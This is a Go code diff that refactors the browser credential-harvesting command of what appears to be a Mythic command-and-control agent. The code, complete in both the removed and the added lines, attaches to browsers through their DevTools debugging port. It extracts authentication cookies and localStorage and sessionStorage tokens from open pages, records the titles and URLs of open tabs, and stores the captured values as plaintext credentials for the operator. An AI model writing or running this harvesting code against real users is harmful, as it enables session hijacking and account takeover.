@@ -53,118 +53,16 @@ func credBrowserLive(args credHarvestArgs) structs.CommandResult {
 	for _, target := range targets {
 		sb.WriteString(fmt.Sprintf("--- %s (port %d) ---\n\n", target.Browser, target.Port))
 
-		// Get list of debuggable page targets
 		pages, err := cdpListTargets(target.Port)
 		if err != nil {
 			sb.WriteString(fmt.Sprintf("  Error listing targets: %s\n\n", err))
 			continue
 		}
 
-		// Extract cookies (only need one connection for all cookies)
-		if len(pages) > 0 {
-			cookies, err := cdpGetAllCookies(pages[0].WebSocketURL)
-			if err != nil {
-				sb.WriteString(fmt.Sprintf("  Cookie extraction error: %s\n\n", err))
-			} else {
-				authCookies := filterAuthCookies(cookies)
-				totalCookies += len(cookies)
-				totalAuthCookies += len(authCookies)
-
-				sb.WriteString(fmt.Sprintf("  Cookies: %d total, %d auth-related\n", len(cookies), len(authCookies)))
-
-				// Show auth cookies in detail
-				for _, c := range authCookies {
-					expires := "session"
-					if c.Expires > 0 {
-						expires = time.Unix(int64(c.Expires), 0).Format("2006-01-02")
-					}
-					flags := cookieFlags(c)
-					sb.WriteString(fmt.Sprintf("    [AUTH] %s: %s = %s (%s, exp %s)\n",
-						c.Domain, c.Name, truncateValue(c.Value, 40), flags, expires))
-
-					creds = append(creds, structs.MythicCredential{
-						CredentialType: "plaintext",
-						Realm:          strings.TrimPrefix(c.Domain, "."),
-						Account:        c.Name,
-						Credential:     c.Value,
-						Comment:        fmt.Sprintf("cred-harvest browser-live (cookie, %s)", target.Browser),
-					})
-				}
-				sb.WriteString("\n")
-			}
-		}
-
-		// Extract localStorage and sessionStorage from each page
-		sb.WriteString("  Local/Session Storage:\n")
-		storageFound := false
-
-		for _, page := range pages {
-			if page.Type != "page" {
-				continue
-			}
-
-			local, sessStorage, err := cdpGetStorage(page.WebSocketURL)
-			if err != nil {
-				continue
-			}
-
-			if len(local) > 0 || len(sessStorage) > 0 {
-				storageFound = true
-				sb.WriteString(fmt.Sprintf("    %s\n", truncateValue(page.URL, 60)))
-			}
-
-			for key, val := range local {
-				totalStorageEntries++
-				if isAuthStorageKey(key) {
-					sb.WriteString(fmt.Sprintf("      [LS] %s = %s\n", key, truncateValue(val, 50)))
-					origin := extractOrigin(page.URL)
-					creds = append(creds, structs.MythicCredential{
-						CredentialType: "plaintext",
-						Realm:          origin,
-						Account:        key,
-						Credential:     val,
-						Comment:        fmt.Sprintf("cred-harvest browser-live (localStorage, %s)", target.Browser),
-					})
-				}
-			}
-
-			for key, val := range sessStorage {
-				totalStorageEntries++
-				if isAuthStorageKey(key) {
-					sb.WriteString(fmt.Sprintf("      [SS] %s = %s\n", key, truncateValue(val, 50)))
-					origin := extractOrigin(page.URL)
-					creds = append(creds, structs.MythicCredential{
-						CredentialType: "plaintext",
-						Realm:          origin,
-						Account:        key,
-						Credential:     val,
-						Comment:        fmt.Sprintf("cred-harvest browser-live (sessionStorage, %s)", target.Browser),
-					})
-				}
-			}
-		}
-
-		if !storageFound {
-			sb.WriteString("    (no auth-related storage entries found)\n")
-		}
-
-		// List open tabs
-		sb.WriteString(fmt.Sprintf("\n  Open Tabs (%d):\n", len(pages)))
-		for i, page := range pages {
-			if page.Type != "page" {
-				continue
-			}
-			if i >= 20 {
-				sb.WriteString(fmt.Sprintf("    ... and %d more\n", len(pages)-20))
-				break
-			}
-			title := page.Title
-			if len(title) > 50 {
-				title = title[:47] + "..."
-			}
-			sb.WriteString(fmt.Sprintf("    %s — %s\n", truncateValue(page.URL, 60), title))
-		}
-		sb.WriteString("\n")
+		nc, na, ns := credBrowserExtractTarget(&sb, &creds, target, pages)
+		totalCookies += nc
+		totalAuthCookies += na
+		totalStorageEntries += ns
 	}
 
 	// Summary
@@ -181,6 +79,95 @@ func credBrowserLive(args credHarvestArgs) structs.CommandResult {
 		result.Credentials = &creds
 	}
 	return result
+}
+
+func credBrowserExtractTarget(sb *strings.Builder, creds *[]structs.MythicCredential, target cdpBrowserTarget, pages []cdpPageTarget) (cookies, authCookies, storageEntries int) {
+	if len(pages) > 0 {
+		allCookies, err := cdpGetAllCookies(pages[0].WebSocketURL)
+		if err != nil {
+			sb.WriteString(fmt.Sprintf("  Cookie extraction error: %s\n\n", err))
+		} else {
+			auth := filterAuthCookies(allCookies)
+			cookies = len(allCookies)
+			authCookies = len(auth)
+			sb.WriteString(fmt.Sprintf("  Cookies: %d total, %d auth-related\n", cookies, authCookies))
+			for _, c := range auth {
+				expires := "session"
+				if c.Expires > 0 {
+					expires = time.Unix(int64(c.Expires), 0).Format("2006-01-02")
+				}
+				sb.WriteString(fmt.Sprintf("    [AUTH] %s: %s = %s (%s, exp %s)\n",
+					c.Domain, c.Name, truncateValue(c.Value, 40), cookieFlags(c), expires))
+				*creds = append(*creds, structs.MythicCredential{
+					CredentialType: "plaintext",
+					Realm:          strings.TrimPrefix(c.Domain, "."),
+					Account:        c.Name,
+					Credential:     c.Value,
+					Comment:        fmt.Sprintf("cred-harvest browser-live (cookie, %s)", target.Browser),
+				})
+			}
+			sb.WriteString("\n")
+		}
+	}
+
+	sb.WriteString("  Local/Session Storage:\n")
+	storageFound := false
+	for _, page := range pages {
+		if page.Type != "page" {
+			continue
+		}
+		local, sess, err := cdpGetStorage(page.WebSocketURL)
+		if err != nil {
+			continue
+		}
+		if len(local) > 0 || len(sess) > 0 {
+			storageFound = true
+			sb.WriteString(fmt.Sprintf("    %s\n", truncateValue(page.URL, 60)))
+		}
+		for key, val := range local {
+			storageEntries++
+			if isAuthStorageKey(key) {
+				sb.WriteString(fmt.Sprintf("      [LS] %s = %s\n", key, truncateValue(val, 50)))
+				*creds = append(*creds, structs.MythicCredential{
+					CredentialType: "plaintext", Realm: extractOrigin(page.URL),
+					Account: key, Credential: val,
+					Comment: fmt.Sprintf("cred-harvest browser-live (localStorage, %s)", target.Browser),
+				})
+			}
+		}
+		for key, val := range sess {
+			storageEntries++
+			if isAuthStorageKey(key) {
+				sb.WriteString(fmt.Sprintf("      [SS] %s = %s\n", key, truncateValue(val, 50)))
+				*creds = append(*creds, structs.MythicCredential{
+					CredentialType: "plaintext", Realm: extractOrigin(page.URL),
+					Account: key, Credential: val,
+					Comment: fmt.Sprintf("cred-harvest browser-live (sessionStorage, %s)", target.Browser),
+				})
+			}
+		}
+	}
+	if !storageFound {
+		sb.WriteString("    (no auth-related storage entries found)\n")
+	}
+
+	sb.WriteString(fmt.Sprintf("\n  Open Tabs (%d):\n", len(pages)))
+	for i, page := range pages {
+		if page.Type != "page" {
+			continue
+		}
+		if i >= 20 {
+			sb.WriteString(fmt.Sprintf("    ... and %d more\n", len(pages)-20))
+			break
+		}
+		title := page.Title
+		if len(title) > 50 {
+			title = title[:47] + "..."
+		}
+		sb.WriteString(fmt.Sprintf("    %s — %s\n", truncateValue(page.URL, 60), title))
+	}
+	sb.WriteString("\n")
+	return
 }
 
 // --- Browser discovery ---
